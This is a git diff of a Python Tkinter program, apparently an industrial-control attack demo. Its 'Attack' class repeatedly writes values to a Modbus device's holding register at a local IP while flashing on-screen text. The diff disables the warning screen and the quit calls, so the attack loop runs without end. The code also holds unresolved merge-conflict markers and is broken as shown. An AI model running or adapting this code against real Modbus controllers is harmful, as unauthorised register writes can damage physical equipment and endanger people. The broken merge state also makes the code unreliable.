@@ -12,7 +12,7 @@ FILE =  os.path.abspath(os.path.dirname(__file__)) + "/file/"
 
 
 def main():
-    app = Application(modbus= ModbusTcpClient('192.168.93.75'))
+    app = Application(modbus= ModbusTcpClient('192.168.93.85'))
     app.run()
     app.destroy()
 
@@ -34,15 +34,15 @@ class Application(Tk):
             self.mainloop()
         
     def gui(self) -> None:
-            context = WarningContext(self)
-            context.run()
-            context.destroy()
+            # context = WarningContext(self)
+            # context.run()
+            # context.destroy()
             
 
             attack_context = Attack(self)
             attack_context.run()
             attack_context.destroy()
-            self.quit()
+            
 
 class Base(Frame):
     def __init__(self, app: Application) -> None:
@@ -105,10 +105,10 @@ class WarningContext(Base):
             font=Font(size=80),
         )
         self.blinking_texts.append(text_commencing_attack)
-        self.wait(10)
+        self.wait(5)
 
         self.AUDIO.stop()
-        self.quit()
+        #self.quit()
         
 class Attack(Base):
 
@@ -119,8 +119,9 @@ class Attack(Base):
 
     def gui(self) -> None:
         values = [1024, 2048, 4096, 8192, 16384]
-        client = ModbusTcpClient('192.168.93.75')
+        client = ModbusTcpClient('192.168.93.85')
         client.connect()
+<<<<<<< HEAD
         try:
             # self.AUDIO_SHD.play()
             # self.wait(4)
@@ -210,6 +211,72 @@ class Attack(Base):
         except Exception as error:
             print(error)
         self.quit()
+=======
+
+
+        try:
+            # self.AUDIO_SHD.play()
+
+            # text_shutdown = Label(
+            #     self,
+            #     text="SHUT DOWN",
+            #     background="black",
+            #     foreground="yellow",
+            #     font=Font(size=200),
+            # )
+            # self.blinking_texts.append(text_shutdown)
+            # self.start_blinking(1.2, 0.4)
+            # self.wait(1.6 * 3)
+            # client.write_register(0, 0)
+            # response = client.read_holding_registers(0)
+            # if isinstance(response, ModbusIOException):
+            #     raise response
+            
+            # self.wait(2)
+            # self.AUDIO_SHD.stop()
+
+            self.AUDIO_ATK.play()
+            text_attack = Label(
+            self,
+            text="HI EVERYONE",
+            background="black",
+            foreground="red",
+            font=Font(size=200),
+            )
+            while True:
+            #for i in range(20):
+                self.blinking_texts.append(text_attack)
+                self.start_blinking(1.2, 0.4)
+                self.wait(1.6 * 3)
+                random_value = choice(values)
+                client.write_register(0, 1024)
+                response = client.read_holding_registers(0)
+                if isinstance(response, ModbusIOException):
+                        raise response
+            # self.AUDIO_ATK.stop()
+
+            # self.AUDIO_SHD.play()
+
+            # text_shutdown = Label(
+            #     self,
+            #     text="SHUT DOWN",
+            #     background="black",
+            #     foreground="yellow",
+            #     font=Font(size=200),
+            # )
+            # self.blinking_texts.append(text_shutdown)
+            # self.start_blinking(1.2, 0.4)
+            # self.wait(1.6 * 3)
+            # client.write_register(0, 0)
+            # response = client.read_holding_registers(0)
+            # if isinstance(response, ModbusIOException):
+            #     raise response
+            
+            # self.AUDIO_SHD.play()
+        except Exception as error:
+            print(error)
+        #self.quit()
+>>>>>>> 6fd951ec6446516740ac1f4b84b439d0353ad249
 if __name__ == "__main__":
     main()
          
